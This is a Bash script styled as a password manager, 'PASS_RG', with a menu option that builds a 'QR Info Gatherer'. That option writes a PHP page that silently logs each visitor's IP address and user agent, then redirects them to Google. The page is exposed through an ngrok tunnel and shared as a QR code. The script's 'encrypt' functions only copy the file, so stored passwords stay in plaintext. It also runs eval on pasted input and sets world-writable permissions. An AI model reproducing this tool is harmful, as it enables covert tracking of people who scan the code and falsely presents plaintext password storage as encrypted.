#!/bin/bash

GREEN="\e[32m"
CYAN="\e[36m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

DB_FILE="passwords.txt"
TEMP_FILE="passwords.tmp"
LOG_FILE="access_logs.csv"
PHP_SERVER_PORT=8080

declare -a BACKGROUND_PIDS=()

show_banner() {
	clear
	echo -e "${CYAN}"
	echo "  _   "
	echo " | | \ / _ \ / _| / _| / ___|"
	echo " | |_) | | | | | _ \_ \ \_ \ "
	echo " | _ <| |_| | |_| | _) | _) |"
	echo " |_| \_\\_/ \| |/ |/"
	echo -e "${RESET}"
	echo -e "${RED}========= PASS_RG (SMART INFO GATHERING) MANAGER =========${RESET}"
}

cleanup() {
	echo -e "\n${YELLOW}Stopping background processes...${RESET}"
	if [ ${#BACKGROUND_PIDS[@]} -gt 0 ]; then
		kill ${BACKGROUND_PIDS[@]} 2>/dev/null
	fi
	encrypt_db
	if [ -f "$TEMP_FILE" ]; then
		shred -u "$TEMP_FILE" 2>/dev/null
	fi
	echo -e "${GREEN}Cleanup complete. Goodbye!${RESET}"
	exit 0
}

trap cleanup INT TERM EXIT

decrypt_db() {
	if [ ! -f "$DB_FILE" ]; then
		echo "" > "$TEMP_FILE"
		return 0
	fi
	cat "$DB_FILE" > "$TEMP_FILE"
}

encrypt_db() {
	cat "$TEMP_FILE" > "$DB_FILE"
}

select_category() {
	echo ""
	echo -e "${CYAN}Choose Category:${RESET}"
	echo "1) Games"
	echo "2) Emails"
	echo "3) Social"
	echo "4) Banking"
	echo "5) Servers"
	echo "6) Custom"
	read -p "Select: " CH
	case "$CH" in
		1) echo "Games" ;;
		2) echo "Emails" ;;
		3) echo "Social" ;;
		4) echo "Banking" ;;
		5) echo "Servers" ;;
		6) read -p "Enter custom category: " CUS; echo "$CUS" ;;
		*) echo "Unknown" ;;
	esac
}

generate_password() {
	local LENGTH=$1
	< /dev/urandom tr -dc 'A-Za-z0-9' | head -c $LENGTH
}

generate_qr() {
	local text="$1"
	local label="$2"
	if ! command -v qrencode &> /dev/null; then
		sudo apt install qrencode -y
	fi
	local filename="qr_codes/${label}_qr.png"
	mkdir -p qr_codes 2>/dev/null
	chmod -R 777 qr_codes 2>/dev/null
	qrencode -o "$filename" "$text"
	echo -e "${GREEN}QR saved:${RESET} $filename"
}

install_dependency() {
	local DEP=$1
	local PACKAGE_NAME=$2
	if ! command -v "$DEP" &> /dev/null; then
		sudo apt update -y > /dev/null
		sudo apt install "$PACKAGE_NAME" -y > /dev/null
		if ! command -v "$DEP" &> /dev/null; then
			exit 1
		fi
	fi
}

install_ngrok_if_needed() {
	install_dependency "php" "php"
	install_dependency "curl" "curl"
	if command -v ngrok &> /dev/null; then
		return 0
	fi
	NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
	wget "$NGROK_URL" -O ngrok.tgz > /dev/null 2>&1
	tar -xzf ngrok.tgz > /dev/null 2>&1
	sudo mv ngrok /usr/local/bin/
	chmod +x /usr/local/bin/ngrok
	rm ngrok.tgz
}

setup_ngrok_authtoken() {
	local NGROK_CONF="$HOME/.config/ngrok/ngrok.yml"
	if [ -f "$NGROK_CONF" ] && grep -q "authtoken" "$NGROK_CONF"; then
		return 0
	fi
	read -p "Paste ngrok authtoken command: " AUTH_COMMAND
	eval "$AUTH_COMMAND"
}

start_collector() {
	install_ngrok_if_needed
	setup_ngrok_authtoken

	if [ ! -f "collector.php" ]; then
		cat <<EOF > collector.php
<?php
date_default_timezone_set('Europe/Berlin');
\$logFile = 'access_logs.csv';
\$time = date('Y-m-d H:i:s');
\$ip = \$_SERVER['REMOTE_ADDR'] ?? 'N/A';
\$ua = str_replace(["\n","\r",","],' ',\$_SERVER['HTTP_USER_AGENT'] ?? 'N/A');
if (!file_exists(\$logFile) || filesize(\$logFile)==0)
	file_put_contents(\$logFile,"Time,IP,User-Agent,Referer\n");
file_put_contents(\$logFile,"\"\$time\",\"\$ip\",\"\$ua\",\"N/A\"\n",FILE_APPEND);
header("Location: https://google.com", true, 303);
exit;
?>
EOF
		chmod 666 collector.php
	fi

	touch "$LOG_FILE"
	chmod 777 "$LOG_FILE"

	php -S 127.0.0.1:$PHP_SERVER_PORT > /dev/null 2>&1 &
	BACKGROUND_PIDS+=($!)

	ngrok http $PHP_SERVER_PORT > /dev/null 2>&1 &
	BACKGROUND_PIDS+=($!)

	PUBLIC_URL=""
	for i in {1..10}; do
		API=$(curl -s http://127.0.0.1:4040/api/tunnels)
		if echo "$API" | grep -q '"public_url"'; then
			PUBLIC_URL=$(echo "$API" | grep -o '"public_url":"[^"]*' | head -n1 | cut -d'"' -f4)
			break
		fi
		sleep 1
	done

	[ -z "$PUBLIC_URL" ] && return 1

	COLLECTOR_URL="${PUBLIC_URL}/collector.php"
	echo "$COLLECTOR_URL"
	read -p "QR label: " QR_LABEL
	generate_qr "$COLLECTOR_URL" "$QR_LABEL"
	read -n1 -s
}

show_banner
decrypt_db

while true; do
	echo -e "${GREEN}1) Add Password"
	echo "2) Generate Password"
	echo "3) Show Passwords"
	echo "4) Search"
	echo "5) Delete All"
	echo "6) Exit${RESET}"
	echo -e "${YELLOW}9) Generate QR Info Gatherer${RESET}"
	read -p "Choose: " CHOICE
	case "$CHOICE" in
		1)
			read -p "Label: " LABEL
			CATEGORY=$(select_category)
			read -p "Password: " PASS
			echo "[$CATEGORY][$LABEL] $PASS" >> "$TEMP_FILE"
			encrypt_db
			;;
		2)
			read -p "Label: " LABEL
			CATEGORY=$(select_category)
			read -p "Length: " LEN
			PASS=$(generate_password "$LEN")
			echo "[$CATEGORY][$LABEL] $PASS" >> "$TEMP_FILE"
			encrypt_db
			read -p "QR? (y/n): " QR
			[ "$QR" = "y" ] && generate_qr "$PASS" "$LABEL"
			;;
		3) nl -w2 -s") " "$TEMP_FILE" ;;
		4) read -p "Search: " W; grep -i "$W" "$TEMP_FILE" ;;
		5) echo "" > "$TEMP_FILE"; encrypt_db ;;
		6) exit ;;
		9) start_collector ;;
	esac
done

